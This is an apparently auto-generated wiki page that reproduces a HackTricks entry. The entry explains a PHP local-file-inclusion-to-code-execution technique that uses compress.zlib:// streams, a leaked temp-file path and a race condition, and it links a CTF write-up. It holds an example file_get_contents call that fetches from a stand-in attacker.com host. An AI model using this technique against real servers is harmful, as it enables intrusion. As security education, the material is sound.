---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-file-inclusion-lfi2rce-via-compress.zlib-php-stream-prefer-studio-path-disclosure` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure](../../topics/pentesting-web/lfi2rce-via-compress.zlib-php-stream-prefer-studio-path-disclosure.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-file-inclusion-lfi2rce-via-compress.zlib-php-stream-prefer-studio-path-disclosure |
| name | LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md |

## Preserved Source Material

````yaml
_body: "# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure\n\n{{#include ../../banners/hacktricks-training.md}}\n\
  \n### `compress.zlib://` and `PHP_STREAM_PREFER_STDIO`\n\nA file opened using the protocol `compress.zlib://` with the flag\
  \ `PHP_STREAM_PREFER_STDIO` can continue writing data that arrives to the connection later to the same file.\n\nThis means\
  \ that a call such as:\n\n```php\nfile_get_contents(\"compress.zlib://http://attacker.com/file\")\n```\n\nWill send a request\
  \ asking for http://attacker.com/file, then the server might respond the request with a valid HTTP response, keep the connection\
  \ open, and send extra data some time later that will be also written into the file.\n\nYou can see that info in this part\
  \ of the php-src code in main/streams/cast.c:\n\n```c\n/* Use a tmpfile and copy the old streams contents into it */\n\n\
  \    if (flags & PHP_STREAM_PREFER_STDIO) {\n        *newstream = php_stream_fopen_tmpfile();\n    } else {\n        *newstream\
  \ = php_stream_temp_new();\n    }\n```\n\n### Race Condition to RCE\n\n[**This CTF**](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)\
  \ was solved using the previous trick.\n\nThe attacker will make the **victim server open a connection reading a file from\
  \ the attackers server** using the **`compress.zlib`** protocol.\n\n**While** this **connection** exist the attacker will\
  \ **exfiltrate the path** to the temp file created (it's leaked by the server).\n\n**While** the **connection** is still\
  \ open, the attacker will **exploit a LFI loading the temp file** that he controls.\n\nHowever, there is a check in the\
  \ web server that **prevents loading files that contains `<?`**. Therefore, the attacker will abuse a **Race Condition**.\
  \ In the connection that is still open the **attacker** will **send the PHP payload AFTER** the **webserver** has **checked**\
  \ if the file contains the forbidden characters but **BEFORE it loads its content**.\n\nFor more information check the description\
  \ of the Race Condition and the CTF in [https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
````
